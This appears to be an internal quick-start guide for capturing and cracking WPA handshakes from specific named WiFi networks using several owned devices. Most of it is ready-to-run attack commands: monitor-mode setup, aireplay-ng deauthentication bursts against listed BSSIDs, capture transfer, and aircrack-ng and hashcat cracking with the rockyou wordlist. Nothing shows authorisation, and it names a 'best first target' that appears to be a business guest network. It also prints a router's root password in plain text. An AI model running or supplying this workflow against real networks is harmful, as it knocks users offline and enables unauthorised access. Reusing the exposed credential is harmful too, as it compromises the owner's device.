# ARES Distributed WiFi - Quick Start Guide

**Date**: January 16, 2026
**Purpose**: Fast reference for WiFi penetration testing using best device selection

---

## 🚀 Quick Command Reference

### 1. Check Which Device to Use

```bash
# Based on signal matrix:

Target: Airtel_vish_0615     → Use: ROUTER
Target: Dharmani Office      → Use: ADMIN SERVER
Target: Dharmani Guest       → Use: ADMIN SERVER
```

### 2. Router Capture (Example: Airtel_vish_0615)

```bash
# From Office Server or any machine
ssh root@10.0.0.81

# Setup
wifi down
iw phy phy0 interface add mon0 type monitor
ip link set mon0 up
iw dev mon0 set channel 6

# Capture
airodump-ng --bssid fc:9f:2a:27:66:1f -c 6 -w /tmp/capture mon0 &
sleep 3
aireplay-ng --deauth 8 -a fc:9f:2a:27:66:1f mon0
sleep 90
killall airodump-ng

# Download to Office Server
exit  # Back to Office Server
scp root@10.0.0.81:/tmp/capture-01.cap /opt/ares/captures/

# Cleanup router
ssh root@10.0.0.81 'iw dev mon0 del && wifi up'
```

### 3. Admin Server Capture (Example: Dharmani Guest)

```bash
# From any machine
ssh admin-server

# Disconnect WiFi
sudo nmcli device disconnect wlp3s0

# Setup monitor
sudo ip link set wlp3s0 down
sudo iw dev wlp3s0 set type monitor
sudo ip link set wlp3s0 up
sudo iw dev wlp3s0 set channel 11

# Capture
sudo airodump-ng --bssid 12:27:f5:dd:07:73 -c 11 -w /tmp/capture wlp3s0 &
sleep 3
sudo aireplay-ng --deauth 8 -a 12:27:f5:dd:07:73 wlp3s0
sleep 90
sudo killall airodump-ng

# Transfer to Office Server
scp /tmp/capture-01.cap office-server:/opt/ares/captures/

# Restore connection
sudo ip link set wlp3s0 down
sudo iw dev wlp3s0 set type managed
sudo ip link set wlp3s0 up
sudo nmcli device connect wlp3s0
```

---

## 📊 Target Network Quick Reference

| Network | BSSID | Ch | Best Device | Signal | Has Clients? |
|---------|-------|----|-----------| -------|--------------|
| Airtel_vish_0615 | fc:9f:2a:27:66:1f | 6 | Router | -45⭐⭐⭐⭐⭐ | ❌ No |
| Dharmani Guest | 12:27:f5:dd:07:73 | 11 | Admin | -45⭐⭐⭐⭐⭐ | ✅ Likely |
| Dharmani Office | 10:27:f5:cd:07:73 | 11 | Admin | -41⭐⭐⭐⭐⭐ | ✅ Yes |

---

## 🎯 Decision Tree

```
1. User specifies target network
   ↓
2. Look up in signal matrix above
   ↓
3. SSH to recommended device
   ↓
4. Setup monitor mode on correct channel
   ↓
5. Check for active clients (10-15 sec scan)
   ↓
6a. Clients found → Deauth (8 packets) + 90s capture
6b. No clients → Passive 120s capture OR choose different target
   ↓
7. Transfer capture to Office Server
   ↓
8. Restore device to normal mode
   ↓
9. Analyze on Office Server
   ↓
10. If handshake → Crack with GPU Server
```

---

## ⚙️ Device Access Commands

```bash
# Router
ssh root@10.0.0.81
# Password: Rama1994#

# Office Server
ssh office-server
# Current user: vibhavaggarwal

# Lab Server
ssh lab-server
# Current user: vibhavaggarwal

# Admin Server
ssh admin-server
# Current user: vibhavaggarwal

# GPU Server
ssh gpu-server
# Current user: vibhavaggarwal
```

---

## 🔧 Common Operations

### Check Current WiFi State

```bash
# Any device
iw dev <interface> info

# Examples:
# Router:  iw dev phy0-ap0 info
# Office:  iw dev wlan0 info
# Lab:     iw dev wlx3460f9927ab3 info
# Admin:   iw dev wlp3s0 info
```

### Scan for Networks

```bash
# Router (from any device)
ssh root@10.0.0.81 'iw dev phy0-ap0 scan | grep -E "BSS|SSID:|signal:"'

# Admin Server (if in managed mode)
ssh admin-server 'sudo iw dev wlp3s0 scan | grep -E "BSS|SSID:|signal:"'
```

### Check for Active Clients

```bash
# During capture, watch airodump-ng output
# Look for STATION column

# If empty → No clients
# If MAC addresses shown → Clients present
```

---

## 📝 Analysis Workflow

### On Office Server

```bash
# 1. Check capture
ls -lh /opt/ares/captures/

# 2. Analyze for handshake
aircrack-ng /opt/ares/captures/capture-01.cap

# 3. If handshake found, convert to hashcat
mkdir -p /opt/ares/handshakes
hcxpcapngtool -o /opt/ares/handshakes/capture.hc22000 \
              /opt/ares/captures/capture-01.cap

# 4. Try CPU crack first
aircrack-ng -w /opt/wordlists/rockyou.txt \
            /opt/ares/captures/capture-01.cap

# 5. If CPU fails, transfer to GPU
scp /opt/ares/handshakes/capture.hc22000 \
    gpu-server:/tmp/

# 6. GPU crack
ssh gpu-server
hashcat -m 22000 /tmp/capture.hc22000 \
        /opt/wordlists/rockyou.txt \
        --opencl-device-types=1,2 \
        --status --status-timer=10
```

---

## ⚠️ Important Notes

### Before Starting

1. **Client Check**: Always check for active clients first
   - No clients = No handshakes possible
   - Consider different target if no clients

2. **Signal Strength**: Use device with best signal
   - < -60 dBm: Excellent success rate
   - -60 to -70: Good success rate
   - > -70 dBm: Low success rate (weak)

3. **Deauth Packets**: Use 5-10 packets (research-based)
   - 8 packets recommended
   - Small burst more effective than 40-50

### During Capture

1. **Stay on Channel**: Never scan all channels
   - Lock to target channel
   - Prevents missing handshake packets

2. **Capture Duration**:
   - With deauth: 90 seconds sufficient
   - Passive: 120+ seconds recommended

3. **Save Everything**: Always use `-w` flag
   - Can't crack without saved capture
   - Save to /tmp then transfer

### After Capture

1. **Cleanup Devices**: Return to normal mode
   - Remove monitor interfaces
   - Restart WiFi services
   - Reconnect Admin Server if needed

2. **Verify Handshake**: Check immediately
   - aircrack-ng analysis
   - Look for "1 handshake" message
   - If none, try again with different approach

---

## 🚨 Troubleshooting

### "No clients detected"

```
Solution: Try different network OR passive long-term capture
         Dharmani Guest likely has clients (guest network)
```

### "Weak signal" (> -70 dBm)

```
Solution: Try different device from signal matrix
         OR choose different target network
```

### "No handshake captured"

```
Solutions:
1. Check if clients were present
2. Try broadcast deauth: aireplay-ng --deauth 8 -a <BSSID> -c FF:FF:FF:FF:FF:FF
3. Increase capture time to 120+ seconds
4. Try multiple deauth bursts
```

### "Device busy" or "Resource busy"

```
Solution: WiFi AP still running
ssh <device> 'wifi down'  # For router
sudo ip link set <interface> down  # For others
```

---

## 📚 Full Documentation

For complete details, see:
- `Distributed-WiFi-Analysis-20260116.md` - Full analysis
- `Device-Capabilities-Matrix.md` - Device details
- `ARES-Stable-Setup-Guide.md` - Initial setup

---

**Quick Start Status**: ✅ Ready to Use
**Best First Target**: Dharmani Guest (Admin Server, -45 dBm, likely has clients)
